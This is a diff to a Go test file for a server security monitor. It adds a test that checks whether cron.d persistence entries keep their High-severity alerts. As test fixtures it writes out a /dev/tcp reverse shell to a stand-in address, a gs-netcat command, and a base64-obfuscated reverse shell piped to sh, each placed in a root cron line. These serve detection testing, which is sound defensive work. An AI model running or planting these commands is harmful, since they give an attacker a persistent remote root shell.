@@ -2,14 +2,50 @@ package checks
 
 import (
 	"context"
+	"encoding/base64"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/pidginhost/csm/internal/alert"
 	"github.com/pidginhost/csm/internal/config"
 )
+
+func TestCronDKnownPersistenceStaysHigh(t *testing.T) {
+	pkgLog := filepath.Join(t.TempDir(), "package.log")
+	if err := os.WriteFile(pkgLog, []byte("transaction\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	oldLogs := pkgManagerLogs
+	pkgManagerLogs = []string{pkgLog}
+	t.Cleanup(func() { pkgManagerLogs = oldLogs })
+
+	for _, branch := range []string{"modified", "added"} {
+		for _, tc := range []struct{ name, command string }{
+			{"tcp_shell", "/bin/bash -c 'exec 3<>/dev/tcp/192.0.2.1/4444; /bin/sh <&3 >&3 2>&3'"},
+			{"gsocket", "/usr/local/bin/gs-netcat -i"},
+			{"encoded_tcp_shell", "echo " + base64.StdEncoding.EncodeToString([]byte("exec 3<>/dev/tcp/192.0.2.1/4444; /bin/sh <&3 >&3 2>&3")) + " | openssl enc -d -a | /bin/sh"},
+		} {
+			t.Run(branch+"/"+tc.name, func(t *testing.T) {
+				const path = "/etc/cron.d/job"
+				content := []byte("* * * * * root " + tc.command + "\n")
+				findings := cronDProvenanceHarness(t, path, content, branch == "added")
+				if len(findings) != 1 {
+					t.Fatalf("want exactly one finding, got %+v", findings)
+				}
+				got := findings[0]
+				if got.Check != "crond_change" || got.Message != "Cron.d file "+branch+": "+path || got.Severity != alert.High {
+					t.Fatalf("known cron persistence must remain High: %+v", got)
+				}
+				if strings.Contains(got.Details, "demoted:") || strings.Contains(got.Details, "Demoted:") {
+					t.Fatalf("vetoed finding contains a demotion reason: %+v", got)
+				}
+			})
+		}
+	}
+}
 
 // cronDChangeHarness drives CheckCrontabs over a single /etc/cron.d file whose
 // stored hash no longer matches content.
